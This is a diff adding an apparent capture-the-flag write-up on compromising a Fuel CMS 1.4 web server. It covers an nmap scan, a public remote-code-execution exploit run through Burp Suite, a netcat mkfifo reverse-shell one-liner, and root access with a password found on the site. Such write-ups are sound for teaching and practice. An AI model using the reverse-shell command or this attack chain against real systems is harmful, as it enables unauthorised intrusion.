@@ -1,0 +1,26 @@
+<h1>Nmap</h1>
+Scanning the ip we find that a web server is running on it.
+<pre><code>PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-title: Welcome to FUEL CMS
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)</code></pre>
+We find the following on the site.
+<br><br><img src="assets/site.png"><br><br>
+Searching google for <code>Fuel CMS version 1.4</code>, We find a vulnerability listed in <code>exploit-dm.com</code>
+<br><br><img src="assets/exploit.png"><br><br>
+Lets download the script and execute it.
+In the script we see that there is a link generated which returns the results of the command executed. It is passed through a proxy of <code>burp suite</code>, So after turning on the
+interception on burp suite we find the request and forwarding it we get the results. <code>Remember to edit the url in the script</code>
+<br><br><img src="assets/rce.png"><br><br>
+So we try to get reverse shell using <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ip port >/tmp/f</code> 
+After getting the reverse shell we find the first flag in home directory of www-data.
+<br><br><img src="assets/flag1.png"><br><br>
+On the site we find an interesting thing
+<br><br><img src="assets/database.png"><br><br>
+We find
+<br><br><img src="assets/password.png"><br><br>
+Login as root using the password and we get root shell.
